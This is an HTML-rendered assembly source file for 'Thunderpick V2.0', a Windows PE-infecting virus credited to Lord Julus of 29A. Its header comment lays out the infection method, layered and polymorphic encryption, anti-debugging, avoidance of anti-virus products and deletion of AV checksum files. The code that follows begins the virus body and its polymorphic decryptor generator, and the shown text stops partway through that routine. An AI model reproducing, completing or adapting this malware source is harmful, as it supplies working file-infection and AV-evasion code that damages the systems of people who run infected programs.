<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>THUNDER.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;  comment $</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Thunderpick is my newest baby. Let's see a briefing about it:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Virus Name    : Thunderpick V2.0</span><span class="sc0">
</span><span class="sc1">;   Virus Author      : Lord Julus / [29A]</span><span class="sc0">
</span><span class="sc1">;   Virus Size    : 7529 bytes</span><span class="sc0">
</span><span class="sc1">;   Release Date      : 1 Nov. 1999</span><span class="sc0">
</span><span class="sc1">;   Target OS     : Win32s, Windows 95/98, Windows NT, Windows 2000</span><span class="sc0">
</span><span class="sc1">;   Target Files      : PE Executbles (EXE, SCR)</span><span class="sc0">
</span><span class="sc1">;   Type          : Non-resident</span><span class="sc0">
</span><span class="sc1">;   Append Method     : Code section relocating and replacing</span><span class="sc0">
</span><span class="sc1">;   Encrypted     : Yes (multiple layers)</span><span class="sc0">
</span><span class="sc1">;   Polymorphic   : Yes (low-level polymorphism)</span><span class="sc0">
</span><span class="sc1">;   Avoid AV files    : Yes</span><span class="sc0">
</span><span class="sc1">;   Kill AV files     : Yes</span><span class="sc0">
</span><span class="sc1">;   Payload Date      : Day 07 of any month after hour 14:00</span><span class="sc0">
</span><span class="sc1">;   Payload       : Graphical</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The  name  of  this virus is the name of one of the best bass solos I</span><span class="sc0">
</span><span class="sc1">;  ever heard, sang by Joey DeMaio from Manowar and which appeared on the "Sign</span><span class="sc0">
</span><span class="sc1">;  of the hammer" album. You should hear it!!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   As  being  a pure Win32 application this virus should have no problem</span><span class="sc0">
</span><span class="sc1">;  in  working  under all actual Win32 environments. The anti-debugging feature</span><span class="sc0">
</span><span class="sc1">;  contains   a call to the IsDebuggerPresent API which doesn't exist on Win95.</span><span class="sc0">
</span><span class="sc1">;  However, to maintain the infection ability on this OS, the anti-debugging is</span><span class="sc0">
</span><span class="sc1">;  avoided a little if the OS is Win95.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   What  is  unique  about this virus is it's appending method. What the</span><span class="sc0">
</span><span class="sc1">;  virus does when infecting a clean victim is this:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   First the code section is located. If the virus length is bigger than</span><span class="sc0">
</span><span class="sc1">;  the victim's code section, the infection process stops. If the virus can fit</span><span class="sc0">
</span><span class="sc1">;  in  the  code    section  then  the  next  steps continue. The last section is</span><span class="sc0">
</span><span class="sc1">;  increased with the virus size plus some additional space. Then, a part equal</span><span class="sc0">
</span><span class="sc1">;  to  the  virus  size  is taken from the code section and copied into the new</span><span class="sc0">
</span><span class="sc1">;  increased  space  in  the  last  section.  After that the relocating code is</span><span class="sc0">
</span><span class="sc1">;  placed  after    it  as  the last piece of code there. All this amount of code</span><span class="sc0">
</span><span class="sc1">;  (original  moved  code  plus  relocating code) get heavily encrypted with an</span><span class="sc0">
</span><span class="sc1">;  algorithm  that  loops  about 500.000 times. Then the virus copied itself in</span><span class="sc0">
</span><span class="sc1">;  the  original code section, over the place which was moved at the end. Then,</span><span class="sc0">
</span><span class="sc1">;  the  entire virus body gets encrypted with two encryption layers. The deeper</span><span class="sc0">
</span><span class="sc1">;  one  is another loooong algorithm (executes around 450.000 instructions) and</span><span class="sc0">
</span><span class="sc1">;  the  above one is the polymorphic algorithm. Then all rearangements are made</span><span class="sc0">
</span><span class="sc1">;  in  the  PE  header,  making  the  entrypoint to point the virus code (which</span><span class="sc0">
</span><span class="sc1">;  resides  in the old code section). When the infected host executes the virus</span><span class="sc0">
</span><span class="sc1">;  will  execute    first.  After  that,  the  control  will  be  passed  to  the</span><span class="sc0">
</span><span class="sc1">;  relocating code which will copy the original code section back into it's old</span><span class="sc0">
</span><span class="sc1">;  place    and make a jump to it. All registers and flags are preserved. In this</span><span class="sc0">
</span><span class="sc1">;  way  the virus code can stay in the code section, making it's detection much</span><span class="sc0">
</span><span class="sc1">;  harder.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Please note that the place into the code section where the virus gets</span><span class="sc0">
</span><span class="sc1">;  placed is random. Also, some random size is added at the end of file to make</span><span class="sc0">
</span><span class="sc1">;  it even harder to remove.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   About  polymorphism,  this  virus  doesn't have a polymorphic engine.</span><span class="sc0">
</span><span class="sc1">;  Instead the polymorphic decryptor is placed at the beginning of the code and</span><span class="sc0">
</span><span class="sc1">;  it gets mutated at infection time.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The  virus  avoids  to  infect  certain  anti-virus products and also</span><span class="sc0">
</span><span class="sc1">;  attempts to delete all AV checksum files it can find.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The  payload  triggers  on the 7th day of any month after 14:00 hour,</span><span class="sc0">
</span><span class="sc1">;  when a MessageBox displays a some verses... ;-)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Credits: Prizzy/29A (for the DR0 WinNT bug)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   $</span><span class="sc0">

</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc2">.486p</span><span class="sc0">                          </span><span class="sc1">;нneeded cpu</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">                   </span><span class="sc1">;нmodel</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">                          </span><span class="sc1">;нsolve jumps</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">TRUE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">;нtrue value</span><span class="sc0">
</span><span class="sc5">FALSE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;нfalse value</span><span class="sc0">
</span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                       </span><span class="sc1">;нdebug status</span><span class="sc0">
</span><span class="sc5">GOAT</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                       </span><span class="sc1">;нinfect goat files?</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">              </span><span class="sc1">;нexternals only required</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">              </span><span class="sc1">;нonly by the first</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">              </span><span class="sc1">;нgeneration</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CheckSumMappedFile</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">                          </span><span class="sc1">;нdummy data area</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">w32nt_lj.inc</span><span class="sc0">                   </span><span class="sc1">;нequates and structures</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                          </span><span class="sc1">;нvirus code starts...</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;н...here</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                       </span><span class="sc1">;нsave all registers</span><span class="sc0">
</span><span class="sc1">;mov eax, end-start                ;н</span><span class="sc0">
</span><span class="sc5">poly_decryptor</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virusrun</span><span class="sc0">                </span><span class="sc1">;нthis is where the poly</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1000d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">                </span><span class="sc1">;нdecryptor will be</span><span class="sc0">
</span><span class="sc5">poly_code_start</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virusrun</span><span class="sc0">                </span><span class="sc1">;нneed this!!!</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">create_poly</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;нThe poly generator stars</span><span class="sc0">
</span><span class="sc1">; EDI = address of code to encrypt         ;нhere...</span><span class="sc0">
</span><span class="sc1">; ESI = address to place decryptor to          ;н</span><span class="sc0">
</span><span class="sc1">; ECX = length of code to encrypt          ;н</span><span class="sc0">
</span><span class="sc1">; EBX = address of code to decrypt at runtime      ;н</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                       </span><span class="sc1">;нsave data</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">address1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">address2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">length</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@100</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;нfill in code address</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFEh</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@101</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;нfill in key</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">polykey</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@102</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFEh</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@104</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;нfill in value</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFEh</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@106</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;нfill in key modifier</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keymodif</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">mangle_loop</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;нchoose random registers</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">regs</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">regs</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">mangle_loop</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">preg</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нfill pointer reg</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@100</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@100</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@500</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@500</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kreg</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нfill key reg</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@101</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@101</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@106</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@106</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lreg</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нfill length reg</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@102</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@102</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нfill code reg</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@104</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@104</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нand others...;-/</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kreg</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@105</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@105</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">preg</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@103</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@103</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
